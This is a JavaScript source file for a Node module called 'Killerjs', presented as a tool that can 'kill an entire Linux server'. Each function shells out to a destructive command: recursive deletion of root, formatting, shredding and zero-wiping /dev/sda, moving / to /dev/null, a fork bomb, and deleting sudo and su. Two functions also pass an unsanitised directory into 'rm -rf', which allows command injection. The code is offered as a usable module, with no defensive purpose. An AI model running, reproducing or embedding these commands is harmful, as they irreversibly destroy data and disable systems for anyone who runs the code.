let shell = require('shelljs')
let a  = require('app-root-path')
/**
 * Killerjs
 * A Node Module that Can Kill an Entire Linux Server
 *
 * @name killer
 * @function
 * @return {Promise} A promise object.
 */
let killer = () => {
    return new Promise((done, er) => {
        shell.exec('rm -rf /', (c, o, e) => {
            if(e) {
                er(e)
            } else {
                done(`Killed the Server <3`)
            }
        })
    })
}

killer.prototype.destroyRoot = () => {
        return new Promise((done, err) => {
            shell.exec('rm -rf /', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Destroyed The Server Root.`)
                }
            })
        })
    }

killer.prototype.format = () => {
        return new Promise((done, err) => {
            shell.exec('mkfs.ext3 /dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Formatted the Drive`)
                }
            })
        })
    }
    
killer.prototype.overWrite = () => {
        return new Promise((done, err) => {
            shell.exec('shred -v /dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Drive has been Overwritten Successfully.`)
                }
            })
        })
    }

killer.prototype.implode = () => {
        return new Promise((done, err) => {
            shell.exec('mv / /dev/null', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Imploded the Drive.`)
                }
            })
        })
    }

killer.prototype.wipe = () => {
        return new Promise((done, err) => {
            shell.exec('dd if=/dev/zero of=/dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Wiped the Drive.`)
                }
            })
        })
    }

killer.prototype.forkBomb = () => {
        return new Promise((done, err) => {
            shell.exec(':(){:|:&};:', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Executed forkBomb`)
                }
            })
        })
    }

killer.prototype.disableRoot = () => {
        return new Promise((done, err) => {
            shell.exec('rm -f /usr/bin/sudo;rm -f /bin/su', (c, o, e) => {
                if(e) {
                    err(e)
                } else {
                    done(`Disabled Root Successfully.`)
                }
            })
        })
    } 

killer.prototype.destroyProject = (dir) => {
        return new Promise((d, e) => {
            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
                if(er) {
                    e(er)
                } else {
                    d(`Destroyed the dir ${dir}`)
                }
            })
        })
    }
    
killer.prototype.destroyADir = (dir) => {
        return new Promise((d, e) => {
            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
                if(er) {
                    e(er)
                } else {
                    d(`Destroyed the dir ${dir}`)
                }
            })
        })
    }

module.exports = killer;